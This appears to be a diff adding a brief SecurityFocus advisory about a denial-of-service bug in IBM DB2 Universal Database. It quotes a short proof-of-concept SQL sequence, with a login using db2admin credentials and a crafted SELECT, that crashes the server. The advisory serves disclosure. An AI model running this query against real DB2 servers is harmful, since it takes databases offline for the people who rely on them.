@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/2067/info
+
+
+IBM DB2 Universal Database is a distributed database application.
+
+It may be possible for a database user to crash the server through a bug in handling certain queries. If a certain query is executed that contains a datetime type and varchar type, the server may cease to fucntion requiring a manual reset. The following example was submitted by Benjurry in their advisory:
+
+connect reset;
+connect to sample user db2admin using db2admin;
+select * from employee where year(birthdate)=1999 and firstnme<'';
+
+It is not known what the cause for this behaviour is. Restarting the application is required in order to regain normal functionality. 
+
